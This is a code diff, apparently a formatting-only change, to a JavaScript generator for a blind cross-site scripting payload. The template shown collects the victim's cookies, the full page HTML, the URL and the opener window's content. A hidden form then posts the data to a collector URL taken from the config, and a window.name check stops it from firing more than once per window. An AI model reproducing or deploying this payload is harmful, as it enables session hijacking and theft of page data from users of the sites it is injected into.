@@ -6,7 +6,10 @@
 function determineInstrusive(config) {
   const capture = {};
   capture.cookie = config.intrusiveLevel === 1 ? 'document.cookie' : 'null';
-  capture.documentBody = config.intrusiveLevel === 1 ? 'document.body.parentNode.innerHTML' : 'identifyTagAndCaptureParentNodes(document.getElementsByTagName("script"))';
+  capture.documentBody =
+    config.intrusiveLevel === 1
+      ? 'document.body.parentNode.innerHTML'
+      : 'identifyTagAndCaptureParentNodes(document.getElementsByTagName("script"))';
   capture.url = config.intrusiveLevel === 1 ? 'document.URL' : 'document.URL';
   capture.location = config.intrusiveLevel === 1 ? 'opener.location' : 'opener.location';
   capture.openerBody = config.intrusiveLevel === 1 ? 'opener.document.body.innerHTML' : 'null';
@@ -92,7 +95,11 @@ function sendXhr(config) {
       var __= document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
       var body = document.getElementsByTagName('body')[0];
 
-      __.setAttribute('value',escape(dcoo+'\\r\\n\\r\\n${config.boundary}'+inne+'\\r\\n\\r\\n${config.boundary}'+durl+'\\r\\n\\r\\n${config.boundary}'+oloc+'\\r\\n\\r\\n${config.boundary}'+oloh+'\\r\\n\\r\\n${config.boundary}'+odoc+'\\r\\n\\r\\n${config.boundary}'+stxt));
+      __.setAttribute('value',escape(dcoo+'\\r\\n\\r\\n${config.boundary}'+inne+'\\r\\n\\r\\n${
+    config.boundary
+  }'+durl+'\\r\\n\\r\\n${config.boundary}'+oloc+'\\r\\n\\r\\n${
+    config.boundary
+  }'+oloh+'\\r\\n\\r\\n${config.boundary}'+odoc+'\\r\\n\\r\\n${config.boundary}'+stxt));
       __.setAttribute('name','_');
       _.appendChild(__);
       _.action='//${config.url}/m';
@@ -124,7 +131,7 @@ function captureInformation(capture) {
 // We check to see if the window.name is __ because by default it will not be
 // After a succesfull capture it will set the window.name to be __
 // This means it will only fire in that window once, preventing spam
-exports.generateTemplate = (config) => {
+exports.generateTemplate = config => {
   const capture = determineInstrusive(config);
   const template = `(function(){
         if(window.name!=='__'){
